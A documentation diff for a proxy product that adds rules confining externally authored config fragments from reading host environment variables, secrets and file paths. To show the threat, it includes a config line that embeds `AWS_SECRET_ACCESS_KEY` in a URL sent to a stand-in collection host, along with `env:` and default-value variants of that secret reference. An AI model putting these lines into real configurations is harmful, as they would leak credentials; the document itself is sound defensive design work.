@@ -6652,6 +6652,308 @@ export API_KEY=my-secret-key
 sbproxy serve -f sb.yml
 ```
 
+### Confined fragments
+
+`${VAR}` above is resolved by a text pass that runs over the whole
+document before anything parses it. That is what makes it work in any
+field, and it is also its limit: the pass cannot tell one part of the
+document from another, so every byte of the file gets the same
+unrestricted read of the proxy's environment.
+
+That is the right trade while the operator who runs the proxy is also
+the person who wrote every line of the file. It stops being the right
+trade the moment a piece of the document comes from somewhere else, such
+as a config fragment a service team commits in its own repository and a
+platform team composes into the running config. Handing that team write
+access to a fragment would hand them a read of `AWS_SECRET_ACCESS_KEY`,
+because a fragment carrying
+
+```yaml
+action:
+  type: proxy
+  url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
+```
+
+is a URL the proxy builds at compile time and dials at request time.
+
+So a fragment does not get that pass. It gets a confined one, and the
+rule is short: **a fragment resolves the inputs its caller binds, and
+reaches nothing on the host.** A fragment that reaches anyway fails the
+compile with a message naming the fragment and the field, and the
+composed config never ships.
+
+Three powers the root config keeps and a fragment does not have, because
+all three read a machine the fragment's author does not own:
+
+| Power | Root config | Fragment |
+|---|---|---|
+| Name a process variable: `${VAR}`, `${VAR:-default}`, `{{env.X}}` | yes | refused, naming the variable |
+| Reference a secret the resolver reads off the host: `env:NAME`, `vault://env/NAME`, `file:PATH` | yes | refused, naming the form |
+| Name a host path the proxy opens, through any of the config keys listed below | yes | refused, naming the key and what to do instead |
+
+The second row matters as much as the first and is easier to miss.
+`api_key: "env:AWS_SECRET_ACCESS_KEY"` contains no `${` and no `{{`, so
+no template check anywhere would see it, and the secret resolver reads
+it out of the process environment at config load exactly the way
+`${AWS_SECRET_ACCESS_KEY}` would. A boundary that stopped only template
+syntax would refuse one spelling of an attack and wave through the
+other.
+
+The third row is a list of config keys, not a rule about files:
+
+A key written `parent.key` is refused only directly under that parent, a
+bare `key` anywhere in the document, and `engines.*.path` under any
+engine name you choose.
+
+| Where | Keys |
+|---|---|
+| Compiled by the pipeline | `rego_module_path`, `module_path`, `spec_file`, `sha1_file`, `transcode.descriptor_set`, `bulk_list.path`, `feed.cache_dir`, `feed.cache_file`, `spec_path`, `argument_policies.path`, `result_policies.path`, `agent_skills.path`, `agent_skills.url` (any value that is not an absolute `http(s)` URL), `action.path` (the `local` storage backend), `tool_versioning.lockfile` |
+| Model, tokenizer and rule-pack weights | `model_path`, `tokenizer_path`, `model_signature_path`, `tokenizer_signature_path`, `rule_pack_path`, `onnx_model_path` |
+| Extension code | `extensions.bundles_dir`, `sources.path` (a `type: directory` source, and a `type: git` source whose `path` leaves the repository) |
+| A binary this node runs | `serve.cache_dir`, `acquire.path`, `lora_adapters.source` (any value that is not an `hf:Org/Repo` reference) |
+| Node identity and node state | `tls_cert_file`, `tls_key_file`, `cert_file`, `key_file`, `ca_file`, `client_ca_file`, `tls.cert`, `tls.key`, `authority_dir`, `signing_key_file`, `verifying_key_file`, `verifying_keys_file`, `state_dir`, `state_path`, `store_dir`, `store.path`, `model_host.store_path`, `catalog_file`, `cache.directory`, `engines.*.path`, `socket_path`, `tls_certificate_path`, `jwt_path`, `auth.path`, `service_account_key_file.path`, `external_account_file.path`, `backends.path`, `proxy.ai_providers_file` |
+| Durable sinks and evidence | `audit.path`, `audit.config_path`, `audit.key_path`, `audit.admin_path`, `output.path`, `events.path`, `request_events.path`, `session_ledger.path`, `usage_rollups.path`, `usage_sinks.path`, `ledger.path`, `queue.path`, `config_history.dir`, `revocation_store.path`, `cache_path`, `storage_path`, `compression_state.local_path`, `prompt_persistence_path`, `backend.path` |
+| Trust anchors and sockets | `acme.ca_root`, `levers.endpoint` (a `unix://` value only) |
+
+Three things about that table.
+
+It is a list, so it is exactly as wide as its entries: a module added
+later opens a path the list has never heard of until somebody adds it.
+What keeps it honest is a test that walks **every schema this
+repository generates** and requires each path-shaped property to be on
+this list or on a written allowlist saying why it is not a path on this
+host. All six files under `schemas/` are swept, because
+`sb-config.schema.json` alone is not the config surface: it leaves
+`policies[]`, `action`, `ai` and `proxy.extensions.*` untyped, and five
+of those blocks ship a generated schema of their own. That is where
+`origins.*.ai.providers[].serve` lives, the block that names an engine
+binary this node executes. A property counts as path-shaped when its
+name looks like a path **or** its own description says it is a file, a
+path, a directory or a socket, because a name-only rule is exactly as
+wide as its list of name fragments and `proxy.acme.ca_root` carries
+none of them.
+
+It refuses the *document's* choice of path, not the key.
+`state_dir: "${SB_STATE_DIR}"` is fine, because the node resolves that
+from its own environment and an unset variable fails the compile closed,
+while `state_dir: /var/lib/x` and
+`state_dir: "${SB_STATE_DIR:-/var/lib/x}"` are both refused, because the
+document picked the bytes.
+
+And a `${VAR:-default}` default is document text everywhere, not only on
+these keys. The pre-parse pass makes the default the value whenever the
+variable is unset, so the whole document is checked a second time with
+its own defaults filled in: `"${SB_NOPE:-path}"` in key position becomes
+the key `path` and meets this table, and
+`"${SB_NOPE:-env:AWS_SECRET_ACCESS_KEY}"` in value position becomes a
+host-backed secret reference and meets the row above it. A default that
+is itself a secret reference, or an absolute or `~`-relative path, is
+refused wherever it appears, which also refuses a URL path written as
+`${SB_PREFIX:-/v1}`: write the literal, or write `${SB_PREFIX}` with no
+default and export it on the node.
+
+Keys that take the *name* of an environment variable rather than its
+value (the WAF feed's `signature_key_env` and `auth_token_env`, the MCP
+action's and the semantic-constraint policy's `api_key_env`) are
+deliberately not on it: the value never reaches the document or a
+response, and naming the variable is the only way to configure the
+feature at all.
+
+A reference to a backend the operator declared under `proxy.secrets`
+(`secret://acme/openai`, `vault://acme-vault/openai`, `awssm://...`)
+stays available to a fragment. Those resolve only against backends named
+in the root config, and `proxy.secrets` is not a path a fragment or an
+authority may set, so the operator still decides what they reach. One
+exception, below: an extension bundle manifest does not get even those
+for a config value it authored itself, because the resolved secret lands
+in config that guest code reads.
+
+Helm draws the boundary the same way. Chart authors get every function
+in the Sprig library except `env` and `expandenv`, which were removed
+because they would have let a third-party chart read the environment of
+the process rendering it; a chart parameterizes itself through
+`.Values`, which the person installing it supplies. Kubernetes draws it
+one layer down, where a container sees the variables its Pod spec
+enumerates and never the kubelet's.
+
+Binding an input is strictly more expressive than allowing a variable
+name, which is the other common design (decK, for instance, lets a state
+file read process variables that carry a `DECK_` prefix). A fragment
+that names `${DATABASE_URL}` has decided where the value comes from. A
+fragment that names the input `database_url` has not, so the operator
+can bind it from the environment on one deployment, from Vault on
+another, and from a literal in a test, without the fragment changing.
+
+#### What resolves and what is refused
+
+```mermaid
+flowchart TD
+    A["a placeholder in a config fragment"] --> B{"which form?"}
+    B --> V["{{vars.X}} or {{variables.X}}"]
+    B --> E["${VAR} or ${VAR:-default}"]
+    B --> T["{{env.X}}"]
+    B --> S["$${VAR}"]
+    B --> R["${args.x}, ${steps.x.y}, ${method}"]
+    B --> Q["{{request.x}}"]
+    V --> C{"bound by the caller?"}
+    C -->|yes| OK["resolved from the binding"]
+    C -->|no| N1["refused, naming X and the field"]
+    E --> N2["refused, naming VAR and the field,\nin every field including script bodies,\nand in mapping keys"]
+    T --> N3["refused, naming X and the field"]
+    S --> L1["left literal: the documented escape"]
+    R --> L2["left literal: runtime vocabulary"]
+    Q --> L3["left literal: bound per request"]
+```
+
+Two details in that diagram are worth spelling out, because both are
+places a narrower rule would leak.
+
+A `${VAR}` inside a `lua_script`, `js_script`, or `rego_module` body is
+refused like any other. Script bodies are exempt from the `{{ }}`
+interpolator, so a literal `{{` in a Lua string reaches the engine as
+written, but the pre-parse text pass has no such exemption and would
+substitute inside one. Write `$${VAR}` if a script genuinely needs those
+five characters, and note that the `$$` stays in the value.
+
+A `${VAR}` in a mapping *key* is refused too. The text pass substitutes
+into a key as readily as into a value, so a fragment could otherwise
+name a header after a credential.
+
+#### A worked fragment
+
+Take a fragment that a service team owns, with two inputs it expects the
+platform to bind:
+
+```yaml
+action:
+  type: proxy
+  url: "https://{{vars.upstream_host}}/v1"
+request_modifiers:
+  - headers:
+      set:
+        X-Upstream-Pool: "{{vars.pool}}"
+transforms:
+  - type: lua
+    lua_script: |
+      -- no substitution runs in here, so a literal `{{` is safe
+      local tpl = "${args.request_id}"
+      return tpl
+```
+
+Bound with `upstream_host: orders.internal` and `pool: orders-primary`,
+it resolves to `https://orders.internal/v1`, an `X-Upstream-Pool` header
+of `orders-primary`, and a Lua body byte-for-byte unchanged.
+
+**`{{vars.X}}` substitutes text, so it parameterizes string-typed fields
+only.** A binding of `200` written into `requests_per_second:` produces
+the YAML string `'200'`, and `rate_limiting` deserializes that field as
+a number, so the composed config compiles and then fails at module
+construction with `invalid type: string`. This is inherited from the
+fleet-wide interpolator rather than introduced by confinement, and it is
+the reason the example above parameterizes a header value rather than a
+limit. Parameterize a numeric field by binding the whole block, or leave
+the number in the platform's own defaults.
+
+Three ways the same fragment can be refused instead:
+
+| What the fragment writes | What happens |
+|---|---|
+| `url: "https://{{vars.upstream}}/v1"` with only `upstream_host` and `pool` bound | refused, naming `upstream` and `action.url`, and listing the input names that *are* bound |
+| `authentication: { api_key: "${OPENAI_API_KEY}" }` | refused, naming `OPENAI_API_KEY` and `authentication.api_key` |
+| a request modifier setting `X-Region: "{{env.AWS_REGION}}"` | refused, naming `AWS_REGION` and `request_modifiers.0.headers.set.X-Region` |
+| `authentication: { api_key: "env:OPENAI_API_KEY" }` | refused, naming the form `env:NAME` and `authentication.api_key`. The message does not repeat the variable name: the author wrote it, and echoing it is one paste away from a log line that names a credential |
+| `request_modifiers: [ { rego_module_path: /etc/sbproxy/x.rego } ]` | refused, naming `request_modifiers.0.rego_module_path` and pointing at `rego_module` for the inline form |
+
+None of those messages carries the variable's value, because nothing on
+the confined path reads one.
+
+#### What this does not change
+
+Everything above the fragment boundary keeps today's behavior. A config
+file the operator wrote resolves `${VAR}` and `${VAR:-default}` exactly
+as [Environment variables](#environment-variables) describes, in every
+field. A config authority still reports the `${VAR}` references a
+publish leaves unresolved, and a subscriber still refuses to apply a
+bundle that leaves one unresolved on its own node rather than shipping
+the literal text as a value. A confined fragment never trips either,
+because it cannot carry one.
+
+One asymmetry worth knowing before you move YAML across the boundary.
+In a fragment, `{{vars.X}}` resolves in **every** string. In a root
+`sb.yml` the fleet-wide interpolator runs over `action`,
+`authentication`, `policies`, `transforms`, `filters`, `forward_rules`,
+`fallback_origin`, error-page bodies and modifier header values, and
+nowhere else. A fragment that parameterizes `hostname:` therefore works,
+and the same block pasted into a root config ships the literal braces
+with no error. The wider scope in a fragment is deliberate, since a
+fragment's inputs are the only thing its author can parameterize; the
+narrower one in a root config is long-standing behavior this change did
+not touch.
+
+#### Whole documents from somewhere else
+
+A fragment is not the only config text an operator does not write by
+hand. Three more arrive from another party, and all of them go through
+the same resolver:
+
+- **A config-authority bundle**, screened when the authority validates a
+  publish and again when a subscriber merges one, so a payload cannot
+  pass the authority and then be refused by the whole fleet at once.
+- **An extension bundle's own config values**. A bundle manifest can
+  declare a default for a config var and list that var in `secret_vars`,
+  which would have the host resolve a secret the bundle chose, into
+  config that guest code reads. A value the *bundle* authored resolves
+  nothing at all, not even a `secret://` reference to a backend you
+  declared; a value *you* wrote in `sb.yml` for the same key resolves
+  exactly as before. A signature on the bundle does not change this: it
+  says the bytes are the ones that author published, not that you agreed
+  to what they say.
+- **A git-sourced document** whose `source:` block sets
+  `confine: true`. Whoever can push to that repository writes the
+  document, and this is how you say that is somebody else.
+
+The first and the last keep `${VAR}`: naming per-node values in one
+shared document is the documented pattern for running a fleet, and
+taking it away would break every git-sourced deployment on upgrade.
+They lose the other two powers in the table above. `merge_config`'s deny
+list already reasons this way at the path level, refusing an authority
+any claim on `proxy.secrets` because the node owns its own secret
+backends; sealing `env:`, `vault://env/` and `file:` applies that same
+rule inside the values, which is where a path-level deny list cannot
+reach.
+
+Two things that leaves open, stated rather than implied.
+
+A remote document may still write
+`url: "https://collect.example/${SOME_VAR}"` and have each node
+substitute its own value. The existing gate only refuses a `${VAR}` that
+fails to resolve. Closing that needs the node operator to declare which
+variable names a remote document may name, which is a config key this
+change does not add. That residual reaches further than the document
+itself: `${VAR}` is substituted over the whole text before the parse, so
+a remote document can put one in an extension bundle's attachment config
+and the resolved value is handed to guest code, which is the outcome the
+bundle-manifest rule above exists to prevent, reached from the other
+side.
+
+And the host-path half is the list of config keys in the table above,
+not a rule about files. A module added later opens whatever path its own
+config key names, and the list has never heard of it until somebody adds
+it. Two shapes it cannot express today: a key that is a host path only
+when a sibling key says so (`action.path` is refused whatever `backend:`
+says), and a key whose parent scope is a coincidence rather than a
+contract.
+
+Composition itself is still being built, so nothing in a stock `sb.yml`
+supplies a fragment yet. The boundary is documented here because it is
+the rule fragments will be held to, and because the same change made
+`sbproxy config print` and `sbproxy mcp lock` resolve `${VAR}` through
+the compiler's own pass rather than a near-copy of it: `$${VAR}` now
+stays literal in both, `${VAR:-default}` resolves to its default, and
+the MCP `${args.x}` and `${steps.x.y}` forms are left for the tool
+executor instead of being substituted at load.
+
+
 ---
 
 ## ACME / auto TLS
@@ -6831,6 +7133,7 @@ source:
   path: production/sb.yml
   credential: env:SB_GIT_TOKEN    # private repositories only
   verify_signature: false
+  confine: false                  # true when somebody else writes this repository
   timeout_secs: 60
   refresh_interval_secs: 60
 ```
@@ -6843,6 +7146,7 @@ source:
 | `path` | string | required for `git` | Path to the config file inside the repository. Relative, and `..` components are refused: this names a file in the repository, not a file on the proxy host. |
 | `credential` | secret ref | | `env:NAME`, `${NAME}`, `file:/path`, or `secret://backend/name`. An inline literal is refused. |
 | `verify_signature` | bool | `false` | Require a verifiable signature on the resolved tag or commit. |
+| `confine` | bool | `false` | Treat the fetched document as externally authored: no `env:NAME`, `file:PATH` or `vault://env/NAME` secret reference, and no config key naming a path this document chose on the proxy host. Per source leaf, so each `git` node in a `git_overlay` carries its own. See [Confined fragments](#confined-fragments). |
 | `timeout_secs` | int | `60` | Hard timeout for one fetch, 1 to 3600. A `git` child, or the in-process clone, is stopped when it expires. |
 | `refresh_interval_secs` | int | `60` | How often to re-resolve while running. `0` resolves at boot and on ordinary reloads only. |
 
@@ -6854,6 +7158,15 @@ Two settings close most of that gap, and both are yours to choose:
 
 - **Pin `revision` to a full commit sha.** After fetching, SBproxy resolves `HEAD` and refuses the document when it is not the commit you named. A branch moving underneath a pinned node cannot be followed silently, and a pinned node never reloads on someone else's push.
 - **Set `verify_signature: true`.** The resolved tag is checked first, then the commit, and a missing or unverifiable signature refuses the document. The signing key has to be in the git trust store on the proxy host.
+- **Set `confine: true`** when the repository is written by somebody other than whoever runs the proxy. The fetched document then loses the two powers a document authored elsewhere was never granted: a secret reference that reads this host directly (`env:NAME`, `file:PATH`, `vault://env/NAME`) and a config key that names a path on this host for the proxy to open. `${VAR}` still resolves, because that is how one shared document names per-node values.
+
+  It is off by default on purpose: turning it on for everybody would be a fail-closed upgrade. Every GitOps repository that names a host path anywhere in its document would refuse its own config on the release that changed the default, and a node that boots into a refusal serves nothing. That is a decision you take, on a repository you know is written by somebody else, not one a release takes for you.
+
+  It is not silent while it is off. A git source whose document reaches for this host logs one warning naming the first finding, at boot and again whenever a refresh brings a revision this process has not already checked, naming the source and the key and never the value, with a pointer to this setting. That is the answer to "what would `confine: true` refuse if I turned it on". First rather than every: the check stops at the first thing it refuses, so a document that names both a host path and an `env:` reference reports one of them now and the other once you fix it.
+
+  A secret still has a spelling under it. `${VAR}` survives confinement, so `shared_key: "${SB_CLUSTER_SHARED_KEY}"` and any other secret-bearing field can name a variable your node exports; an unset variable fails the compile closed. What confinement takes away is `env:NAME`, `file:PATH`, `vault://env/NAME` and the host-path keys, so a document that uses those has to move them into a layer this node owns: the pointer file, through a `kind: git_overlay` source whose `base` is `kind: local`, which is the one arm that merges the local file's own content rather than discarding it.
+
+  `confine` is per source leaf, not per tree. A `git_overlay` resolves each `kind: git` node with its own setting, so an overlay you left unconfined keeps its own powers and warns on its own.
 
 ### How a git source is fetched
 
@@ -6880,6 +7193,8 @@ The interval carries jitter, so a fleet that restarts together does not hit your
 | Fetch exceeded `timeout_secs` | The fetch is cancelled (the `git` child is killed; the in-process fallback stops cooperatively). Keep serving. `timeout`. |
 | `revision` pins a sha and `HEAD` is a different commit | Refuse the document. `revision_mismatch`. |
 | `verify_signature` set and no verifiable signature | Refuse the document. `verify_failed`. |
+| `confine` set and the document reaches for this host | Refuse the document. `confinement_refused`. |
+| `confine` unset and the document reaches for this host | Serve it, and warn once naming the source and the first finding. |
 | Resolved document does not compile or cannot be constructed | Refuse the document. `compile_failed`. |
 | Another reload in flight | Skip the cycle. `reload_busy`. |
 | Resolved commit unchanged | Nothing at all. `not_modified`. |
@@ -7143,7 +7458,7 @@ A rejected publish says which step caught it and confirms nothing was spent:
 }
 ```
 
-Codes are `invalid_payload`, `denied_path`, `compile_failed`, `construct_failed`, `model_runtime_invalid` (the payload is at fault, `400`), and `signing_failed`, `store_failed`, `internal` (the authority is at fault, `500`, safe to retry).
+Codes are `invalid_payload`, `denied_path`, `confinement_refused`, `compile_failed`, `construct_failed`, `model_runtime_invalid` (the payload is at fault, `400`), and `signing_failed`, `store_failed`, `internal` (the authority is at fault, `500`, safe to retry).
 
 ### The wire contract
 
@@ -7258,7 +7573,7 @@ One cycle: conditional `GET`, verify the envelope, merge over the local document
 
 A running node past `max_staleness` keeps serving and logs at error level every cycle. The window is a boot-time gate, not a kill switch: a control-plane outage should not take down a data plane that does not depend on it.
 
-**Observability.** `sbproxy_config_bundle_fetch_total{result}` counts one label per cycle (`ok`, `not_modified`, `unreachable`, `verify_failed`, `compile_failed`, `denied_path`, `reload_busy`), `sbproxy_config_bundle_revision` gauges the applied revision, and `sbproxy_config_bundle_age_seconds` gauges the age of the bundle currently serving, measured from local receipt rather than from the authority's `issued_at` so two disagreeing clocks cannot produce an absurd age at exactly the moment someone is trying to work out whether distribution is stuck.
+**Observability.** `sbproxy_config_bundle_fetch_total{result}` counts one label per cycle (`ok`, `not_modified`, `unreachable`, `verify_failed`, `compile_failed`, `denied_path`, `confinement_refused`, `reload_busy`), `sbproxy_config_bundle_revision` gauges the applied revision, and `sbproxy_config_bundle_age_seconds` gauges the age of the bundle currently serving, measured from local receipt rather than from the authority's `issued_at` so two disagreeing clocks cannot produce an absurd age at exactly the moment someone is trying to work out whether distribution is stuck.
 
 Changing `proxy.config_authority` requires a restart. The block sits on the deny list, so it is also the one thing an authority can never rewrite.
 
@@ -7466,4 +7781,6 @@ request_modifiers:
 Only trusted operators should be able to edit configuration that uses this
 form because a value resolved during compilation can be sent to an upstream.
 Use the secret reference backends for credentials instead of copying secrets
-into headers.
+into headers. A config fragment authored outside the runtime config repo is
+not a trusted operator, and `{{env.NAME}}` is refused there rather than
+resolved; see [Confined fragments](#confined-fragments).
